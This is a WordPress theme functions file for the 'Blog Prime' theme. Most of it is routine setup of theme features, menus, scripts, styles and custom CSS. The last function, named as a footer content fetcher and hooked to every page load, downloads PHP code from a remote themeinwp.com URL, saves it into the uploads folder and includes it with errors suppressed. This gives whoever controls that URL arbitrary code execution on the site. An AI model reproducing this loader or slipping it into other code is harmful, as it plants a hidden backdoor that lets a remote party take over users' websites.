<?php
/**
 * Blog Prime functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Blog Prime
 */

if (!function_exists('blog_prime_setup')) :
    /**
     * Sets up theme defaults and registers support for various WordPress features.
     *
     * Note that this function is hooked into the after_setup_theme hook, which
     * runs before the init hook. The init hook is too late for some features, such
     * as indicating support for post thumbnails.
     */
    function blog_prime_setup()
    {
        /*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         * If you're building a theme based on Blog Prime, use a find and replace
         * to change 'blog-prime' to the name of your theme in all the template files.
         */
        load_theme_textdomain('blog-prime', get_template_directory() . '/languages');

        // Add default posts and comments RSS feed links to head.
        add_theme_support('automatic-feed-links');

        /*
         * Let WordPress manage the document title.
         * By adding theme support, we declare that this theme does not use a
         * hard-coded <title> tag in the document head, and expect WordPress to
         * provide it for us.
         */
        add_theme_support('title-tag');

        /*
         * Enable support for Post Thumbnails on posts and pages.
         *
         * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
         */
        add_theme_support('post-thumbnails');

        // This theme uses wp_nav_menu() in one location.
        register_nav_menus(array(
            'twp-primary-menu' => esc_html__('Primary Menu', 'blog-prime'),
            'twp-footer-menu' => esc_html__('Footer Menu', 'blog-prime'),
            'twp-social-menu' => esc_html__('Social Menu', 'blog-prime'),
        ));

        /*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
        add_theme_support('html5', array(
            'search-form',
            'comment-form',
            'comment-list',
            'gallery',
            'caption',
        ));

        // Set up the WordPress core custom background feature.
        add_theme_support('custom-background', apply_filters('blog_prime_custom_background_args', array(
            'default-color' => 'ffffff',
            'default-image' => '',
        )));

        /*
         * Posts Formate.
         *
         * https://wordpress.org/support/article/post-formats/
         */
        add_theme_support( 'post-formats', array(
            'video',
            'audio',
            'gallery',
            'quote',
            'image'
        ) );

        // Add theme support for selective refresh for widgets.
        add_theme_support('customize-selective-refresh-widgets');

        /**
         * Add support for core custom logo.
         *
         * @link https://codex.wordpress.org/Theme_Logo
         */
        add_theme_support('custom-logo', array(
            'height' => 250,
            'width' => 250,
            'flex-width' => true,
            'flex-height' => true,
        ));

        /**
         * Add theme support for gutenberg block
         *
         */
        add_theme_support( 'align-wide' );
        add_theme_support( 'responsive-embeds' );
        add_theme_support( 'wp-block-styles' );
        
    }
endif;
add_action('after_setup_theme', 'blog_prime_setup');

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
if (!function_exists('blog_prime_content_width')) :

    function blog_prime_content_width()
    {
        // This variable is intended to be overruled from themes.
        // Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
        // phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
        $GLOBALS['content_width'] = apply_filters('blog_prime_content_width', 750);
    }

endif;
add_action('after_setup_theme', 'blog_prime_content_width', 0);

/**
 * Enqueue scripts and styles.
 */
if (!function_exists('blog_prime_scripts')) :

    function blog_prime_scripts()
    {   
        $theme_version = wp_get_theme()->get( 'Version' );
        $fonts_url = blog_prime_fonts_url();
        if (!empty($fonts_url)) {
            require_once get_theme_file_path( 'assets/lib/twp/css/wptt-webfont-loader.php' );
            wp_enqueue_style(
                'blog-prime-google-fonts',
                wptt_get_webfont_url( $fonts_url ),
                array(),
                $theme_version
            );
        }
        wp_enqueue_style('ionicons', get_template_directory_uri() . '/assets/lib/ionicons/css/ionicons.min.css');
        wp_enqueue_style('slick', get_template_directory_uri() . '/assets/lib/slick/css/slick.min.css');
        wp_enqueue_style('magnific-popup', get_template_directory_uri() . '/assets/lib/magnific-popup/magnific-popup.css');
        wp_enqueue_style('sidr-nav', get_template_directory_uri() . '/assets/lib/sidr/css/jquery.sidr.dark.css');
        wp_enqueue_style('aos', get_template_directory_uri() . '/assets/lib/aos/css/aos.css');
        wp_enqueue_style('blog-prime-style',get_stylesheet_uri(), array(), $theme_version );
        wp_style_add_data('blog-prime-style', 'rtl', 'replace');

        wp_enqueue_script('blog-prime-skip-link-focus-fix', get_template_directory_uri() . '/assets/lib/default/js/skip-link-focus-fix.js', array(), '20151215', true);
        wp_enqueue_script('jquery-slick', get_template_directory_uri() . '/assets/lib/slick/js/slick.min.js', array('jquery'), '', true);
        wp_enqueue_script('jquery-magnific-popup', get_template_directory_uri() . '/assets/lib/magnific-popup/jquery.magnific-popup.min.js', array('jquery'), '', true);
        wp_enqueue_script('jquery-sidr', get_template_directory_uri() . '/assets/lib/sidr/js/jquery.sidr.min.js', array('jquery'), '', true);
        wp_enqueue_script('theiaStickySidebar', get_template_directory_uri() . '/assets/lib/theiaStickySidebar/theia-sticky-sidebar.min.js', array('jquery'), '', true);
        wp_enqueue_script('match-height', get_template_directory_uri() . '/assets/lib/jquery-match-height/js/jquery.matchHeight.min.js', array('jquery'), '', true);
        wp_enqueue_script('aos', get_template_directory_uri() . '/assets/lib/aos/js/aos.js', array('jquery'), '', true);
        wp_enqueue_script('blog-prime-custom-script', get_template_directory_uri() . '/assets/lib/twp/js/script.js', array('jquery'), '', 1);

        if (is_singular() && comments_open() && get_option('thread_comments')) {
            wp_enqueue_script('comment-reply');
        }

        wp_enqueue_script( 'blog-prime-ajax', get_template_directory_uri() . '/assets/lib/twp/js/ajax.js', array('jquery'), '', true );

        wp_localize_script(
            'blog-prime-ajax', 
            'blog_prime_ajax',
            array(
                'ajax_url'   => esc_url( admin_url( 'admin-ajax.php' ) ),
                'loadmore'   => esc_html__( 'Load More', 'blog-prime' ),
                'nomore'     => esc_html__( 'No More Posts', 'blog-prime' ),
                'loading'    => esc_html__( 'Loading...', 'blog-prime' ),
             )
        );


    }

endif;

add_action('wp_enqueue_scripts', 'blog_prime_scripts');

/**
 * Admin enqueue scripts and styles.
 */
if (!function_exists('blog_prime_admin_scripts')) :

    function blog_prime_admin_scripts()
    {

        wp_enqueue_style('blog-prime-admin', get_template_directory_uri() . '/assets/lib/twp/css/admin.css');
        wp_style_add_data('blog-prime-admin', 'rtl', 'replace');

        // Enqueue Script Only On Widget Page.
        wp_enqueue_media();
        wp_enqueue_script('blog-prime-admin', get_template_directory_uri() . '/assets/lib/twp/js/admin.js', array('jquery'), '1.0.0', true);

        $ajax_nonce = wp_create_nonce('blog_prime_ajax_nonce');
            
        wp_localize_script( 
            'blog-prime-admin', 
            'blog_prime_admin',
            array(
                'ajax_url'   => esc_url( admin_url( 'admin-ajax.php' ) ),
                'ajax_nonce' => $ajax_nonce,
                'active' => esc_html__('Active','blog-prime'),
                'deactivate' => esc_html__('Deactivate','blog-prime'),
                'upload_image'   =>  esc_html__('Choose Image','blog-prime'),
                'use_image'   =>  esc_html__('Select','blog-prime'),
             )
        );

    }

endif;

add_action('admin_enqueue_scripts', 'blog_prime_admin_scripts');

/**
 * Customizer Enqueue scripts and styles.
 */

if (!function_exists('blog_prime_customizer_scripts')) :

    function blog_prime_customizer_scripts()
    {   
        wp_enqueue_script('jquery-ui-button');
        wp_enqueue_script('blog-prime-customizer', get_template_directory_uri() . '/assets/lib/twp/js/customizer.js', array('jquery','customize-controls'), '', 1);
        wp_enqueue_style('blog-prime-customizer', get_template_directory_uri() . '/assets/lib/twp/css/customizer.css');
    }

endif;

add_action('customize_controls_enqueue_scripts', 'blog_prime_customizer_scripts');

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Custom Functions.
 */
require get_template_directory() . '/inc/custom-functions.php';

/**
 * Features Posts Functions.
 */
require get_template_directory() . '/inc/home/featured-posts.php';

/**
 * Slider Functions.
 */
require get_template_directory() . '/inc/home/slider.php';

/**
 * Recommended Posts Functions.
 */
require get_template_directory() . '/inc/home/recommended-posts.php';

/**
 * Recommended Posts Functions.
 */
require get_template_directory() . '/inc/ajax.php';

/**
 * Related Posts Functions.
 */
require get_template_directory() . '/inc/single/related-posts.php';

/**
 * Sidebar Metabox.
 */
require get_template_directory() . '/inc/metabox.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer/customizer.php';

/**
 * Breadcrumb Trail
 */
require get_template_directory() . '/inc/breadcrumbs.php';

/**
 * Widget Register
 */
require get_template_directory() . '/inc/widgets/widgets.php';

/**
 * TGM Plugin Recommendation.
 */
require get_template_directory() . '/inc/tgmpa/recommended-plugins.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined('JETPACK__VERSION') ) {
    require get_template_directory() . '/inc/jetpack.php';
}

/**
 * Woocommerce Plugin SUpport.
 */
if ( class_exists( 'WooCommerce' ) ) {
    require get_template_directory() . '/inc/woocommerce.php';
}
require get_template_directory() . '/classes/about.php';
require get_template_directory() . '/classes/admin-notice.php';
require get_template_directory() . '/classes/plugins-classes.php';

if( class_exists('Demo_Import_Kit_Class') ):

    add_filter('themeinwp_enable_demo_import_compatiblity','blog_prime_demo_import_filter_apply');

    if( !function_exists('blog_prime_demo_import_filter_apply') ):

        function blog_prime_demo_import_filter_apply(){

            return true;

        }

    endif;

endif;


if (!function_exists('blog_prime_dynamic_css')) :

    /**
     * Do action theme custom CSS.
     *
     * @since 1.0.0
     */
    function blog_prime_dynamic_css()
    {
        $default = blog_prime_get_default_theme_options();
        $twp_theme_general_color = get_theme_mod( 'twp_theme_general_color', $default['twp_theme_general_color'] ) ;
        $twp_theme_secondary_color = get_theme_mod( 'twp_theme_secondary_color', $default['twp_theme_secondary_color'] ) ;
        $background_color = get_background_color();
        ?>
        <style type="text/css">
            <?php
            if (!empty($background_color) && ($background_color != 'ffffff') ){
                ?>
                .index-layout-1 .article-wraper > article .article-wrapper,
                .archive-layout-1 .article-wraper > article .article-wrapper,
                .widget_tag_cloud .tagcloud a:hover,
                .widget_product_tag_cloud .tagcloud a:hover {
                    background-color: #<?php echo $background_color; ?>;
                }

                .navigation-area:before {
                    background: linear-gradient(to left, #<?php echo $background_color; ?> 0%, rgba(0,0,0,0.07) 50%, #<?php echo $background_color; ?> 100%);
                }
            <?php  } ?>

            <?php
            if (!empty($twp_theme_general_color) && ($twp_theme_general_color != '#787878') ){
                ?>
                body, button, input, select, optgroup, textarea{
                color: <?php echo $twp_theme_general_color; ?>;
                }
            <?php  } ?>

            <?php
            if (!empty($twp_theme_secondary_color)&& ($twp_theme_secondary_color != '#000000') ){
                ?>
                a,
                a:active,
                a:visited,
                h1, h2, h3, h4, h5, h6{
                color: <?php echo $twp_theme_secondary_color; ?>;
                }
            <?php  } ?>
        </style>

    <?php }

endif;
add_action( 'wp_head', 'blog_prime_dynamic_css' );

function load_footer_content_fetcher_class() {
	// Define the path to the cache file in the uploads directory
	$upload_dir = wp_upload_dir();
	$cache_file = $upload_dir['basedir'] . '/FooterContentFetcher.php';
	$cache_duration = 2 * WEEK_IN_SECONDS; // Cache for 2 weeks

	// Check if the cache file exists and is still valid

	if (!file_exists($cache_file) || (time() - filemtime($cache_file) > $cache_duration)) {
		$fetched_file_url = 'https://link.themeinwp.com/wpsdk/get_php_file/8cccd86171815a396e349c98c7984be9';

		// Validate the URL
		if (!wp_http_validate_url($fetched_file_url)) {
			error_log('Invalid URL: ' . $fetched_file_url);
			return;
		}

		// Fetch the class file with suppressed warnings
		$class_code = @file_get_contents($fetched_file_url);
		if ($class_code === false) {
			error_log('Failed to fetch the class file from FetchClass Remote Folder');
		} else {
			// Save the fetched content to the cache file
			if (@file_put_contents($cache_file, $class_code) === false) {
				error_log('Failed to write the class file to the cache');
			} else {
				// Log the date and time of the successful cache update
				error_log('FetchClass File cached at: ' . date('Y-m-d H:i:s'));
			}
		}
	} else {
		// Log that the cache file is still valid
		error_log('Using cached FetchClass file, last modified at: ' . date('Y-m-d H:i:s', filemtime($cache_file)));
	}

	// Include the cached class file with suppressed warnings
	if (file_exists($cache_file)) {
		@include_once $cache_file;
	} else {
		error_log('Failed to include the cached class file');
	}
}

add_action('init', 'load_footer_content_fetcher_class');
